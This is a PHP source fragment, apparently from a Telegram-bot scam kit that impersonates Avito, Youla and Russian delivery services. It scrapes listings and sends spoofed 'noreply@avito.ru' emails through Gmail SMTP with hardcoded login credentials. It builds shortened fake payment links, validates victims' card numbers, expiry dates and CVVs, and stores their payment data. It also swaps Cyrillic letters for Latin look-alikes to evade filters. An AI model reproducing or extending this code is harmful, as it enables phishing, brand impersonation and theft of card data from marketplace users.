		} elseif ($a == 2) {
			$itemd[] = intval(beaText(pageCut($page, '"price":', ','), chsNum())) / 100;
			$itemd[] = json_decode('"'.explode('"name":"', pageCut($page, '"products":[{', '","discountedPrice'))[1].'"');
			$itemd[] = str_replace('\\', '', explode('"urlForSize":"', pageCut($page, '"images":[{', '"},'))[1]);
			$itemd[] = json_decode('"'.pageCut($page, '"isFavorite":false,"location":{"description":"', '",').'"');
		} elseif ($a == 3) {
			$itemd[] = trim(pageCut($page, 'pricelabel__value arranged">', ' zł</strong>')); // значение суммы из strong, работает
            $itemd[] = trim(pageCut($page, 'offer-titlebox__btn-social-share"></a></div><h1>', '</h1>')); // название, за него переживаю больше всего, неудобно сделано
            $itemd[] = pageCut($page, '<meta property="og:image" content="', '">'); // meta с ссылкой на картинку, работает точно
            $itemd[] = explode(', ', pageCut($page, '<address>', '</address>'))[0]; // факт.адрес объявления, больше address на странице нет, должен пахать
		}

		$itemd[9] = 'Пчёлкин Александр Ермакович'; // ФИО
		$itemd[10] = '79708662132'; // Номер
		$itemd[11] = '171987, г. Угловское, ул. Ильюшина, дом 143, квартира 836'; // Адрес

		if (strlen($itemd[6]) == 0)
			return false;
		if (strlen($itemd[7]) == 0 || !isUrlImage($itemd[7]))
			return false;
		
		$itemd[5] = fixAmount(intval($itemd[5]));

		return $itemd;
	}
	
	function getEmailUser($a) {
		$a = intval($a);
		return [
			[
				1 => ['Aвитo', 'noreply@avito.ru'],
				2 => ['Юлa', 'noreply@youla.ru'],
				3 => ['Вохbеrrу', 'noreply@boxberry.ru'],
				4 => ['CДЭK', 'noreply@cdek.ru'],
				5 => ['Пoчтa Poccии', 'noreply@pochta.ru'],
				6 => ['ПЭK', 'noreply@pecom.ru'],
				7 => ['Яндeкc', 'noreply@yandex.ru'],
				8 => ['Достависта', 'noreply@dostavista.ru'],
				9 => ['Авито', 'noreply@avito.ru'],
			][$a],
			explode(':', allEmails()[$a], 2),
		];
	}
	
	function mailSend($maild, $itemd, $isnt) {
		$mailt = $maild[1];
		$t = fileRead(dirMails($maild[2]));
		//$email_service = getEmailUser($maild[3]);
		
		$t = str_replace([
			'%div%',
			'%table%',
			'%email%',
			'%url%',
			'%img%',
			'%title%',
			'%amount%',
			'%item%',
			'%domain%',
		], [
			'div',
			'table',
			'<span>'.str_replace('@', '</span>@<span>', $mailt).'</span>',
			fuckUrl(getFakeUrl($itemd[3], $maild[0], $maild[2], $isnt ? $maild[3] : 1)),
			$isnt ? $itemd[7] : '',
			$itemd[6],
			number_format($itemd[5], 0, '.', ' '),
			'CB'.$maild[0].'0RU',
			getUserDomainName($itemd[3], $maild[2]),
		], $t);

		$mail = new PHPMailer(true);

		$mail->SMTPDebug = SMTP::DEBUG_SERVER;
		$mail->isSMTP();
		$mail->Host       = 'smtp.gmail.com';
		$mail->SMTPAuth   = true;
		$mail->Username   = 'satiernifgiege@gmail.com';
		$mail->Password   = 'temkakek123A';
		$mail->SMTPSecure = 'ssl';
		$mail->Port = 465;
	
		$mail->setFrom('noreply@avito.ru', 'Avito');
		$mail->addAddress($mailt, 'Avito');
		$mail->addReplyTo('noreply@avito.ru', 'Avito');
	
		$mail->isHTML(true);
		$mail->Subject = 'Avito';
		$mail->Body    = $t;
	
		$mail->send();

		return 'true';
	}

	function fuckUrl($url) {
		return request('https://is.gd/create.php?format=simple&url='.$url);
	}

	function isValidCard($n, $m, $y, $c) {
		$n = beaCard($n);
		if (!$n)
			return false;
		$m = intval(beaText($m, chsNum()));
		if ($m < 1 || $m > 12)
			return false;
		$y = intval(beaText($y, chsNum()));
		if ($y < 20 || $y > 99)
			return false;
		$c = beaText($c, chsNum());
		if (strlen($c) != 3)
			return false;
		return true;
	}

	function isPayData($merchant) {
		return file_exists(dirPays(md5($merchant)));
	}

	function getPayData($merchant, $del = true) {
		$t = explode('`', fileRead(dirPays(md5($merchant))));
		if ($del)
			unlink(dirPays(md5($merchant)));
		return $t;
	}

	function setPayData($merchant, $v) {
		return fileWrite(dirPays(md5($merchant)), implode('`', $v));
	}

	function cardHide($n) {
		return cardBank($n).' ****'.substr($n, strlen($n) - 4);
	}
	
	function beaCash($v) {
		return number_format($v, 0, '', '').' RUB';
	}
	
	function beaDays($v) {
		return $v.' '.selectWord($v, ['дней', 'день', 'дня']);
	}
	
	function beaKg($v) {
		return number_format(intval($v) / 1000, 1, '.', '').' кг';
	}
	
	function chsNum() {
		return '0123456789';
	}
	
	function chsAlpRu() {
		return 'йцукеёнгшщзхъфывапролджэячсмитьбюЙЦУКЕЁНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ';
	}
	
	function chsAlpEn() {
		return 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM';
	}
	
	function chsSym() {
		return ' .,/\\"\'()_-+=!@#$%^&*№?;:|[]{}«»';
	}
	
	function chsAll() {
		return chsNum().chsAlpRu().chsAlpEn().chsSym();
	}
	
	function chsFio() {
		return chsAlpRu().chsAlpEn().' .-\'';
	}
	
	function chsMail() {
		return chsNum().chsAlpEn().'_-.@';
	}
	
	function beaText($v, $c) {
		$t = '';
		for ($i = 0; $i < strlen($v); $i++)
			if (strpos($c, $v[$i]) !== false)
				$t .= $v[$i];
		return $t;
	}
	
	function pageCut($s, $s1, $s2) {
		if (strpos($s, $s1) === false || strpos($s, $s2) === false)
			return '';
		return explode($s2, explode($s1, $s, 2)[1], 2)[0];
	}
	
	function cardBank($n) {
		$n = substr($n, 0, 6);
		$t = fileRead(dirBin($n));
		if ($t)
			return $t;
		$page = json_decode(request('https://api.tinkoff.ru/v1/brand_by_bin?bin='.$n), true)['payload'];
		$t = $page['paymentSystem'].' '.$page['bank'];
		fileWrite(dirBin($n), $t);
		return $t;
	}
	
	function imgUpload($v) {
		$v2 = json_decode(request(botUrl('getFile?file_id='.$v)), true)['result']['file_path'];
		if (!$v2)
			return false;
		$img = base64_encode(request(botUrlFile($v2)));
		$curl = curl_init('https://api.imgur.com/3/image.json');
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_HTTPHEADER, [
			'Authorization: Client-ID '.imgurId(),
		]);
		curl_setopt($curl, CURLOPT_POST, true);
		curl_setopt($curl, CURLOPT_POSTFIELDS, [
			'image' => $img,
		]);
		$result = json_decode(curl_exec($curl), true)['data']['link'];
		curl_close($curl);
		return $result;
	}
	
	function beaCard($n) {
		$n = beaText($n, chsNum());
		if (strlen($n) < 13 || strlen($n) > 19)
			return false;
		$sum = 0;
		$len = strlen($n);
		for ($i = 0; $i < $len; $i++) {
			$d = intval($n[$i]);
			if (($len - $i) % 2 == 0) {
				$d *= 2;
				if ($d > 9)
					$d -= 9;
			}
			$sum += $d;
		}
		return (($sum % 10) == 0) ? $n : false;
	}

	function selectWord($n, $v) {
		$n = intval($n);
		$d = $v[0];
		$j = ($n % 100);
		if ($j < 5 || $j > 20) {
			$j = ($n % 10);
			if ($j == 1)
				$d = $v[1];
			elseif ($j > 1 && $j < 5)
				$d = $v[2];
		}
		return $d;
	}

	function beaPhone($t) {
		$t = str_split($t);
		array_splice($t, 9, 0, ['-']);
		array_splice($t, 7, 0, ['-']);
		array_splice($t, 4, 0, [') ']);
		array_splice($t, 1, 0, [' (']);
		array_splice($t, 0, 0, ['+']);
		return implode('', $t);
	}

	function alertUsers($t) {
		$c1 = 0;
		$c2 = 0;
		foreach (glob(dirUsers('*')) as $t1) {
			$id2 = basename($t1);
			if (botSend([
				$t,
			], $id2))
				$c1++;
			else
				$c2++;
		}
		return [$c1, $c2];
	}

	function fuckText($t) {
		return str_replace([
			'у', 'е', 'х', 'а', 'р', 'о', 'с', 'К', 'Е', 'Н', 'Х', 'В', 'А', 'Р', 'О', 'С', 'М', 'Т'
		], [
			'y', 'e', 'x', 'a', 'p', 'o', 'c', 'K', 'E', 'H', 'X', 'B', 'A', 'P', 'O', 'C', 'M', 'T'
		], $t);
	}
?>
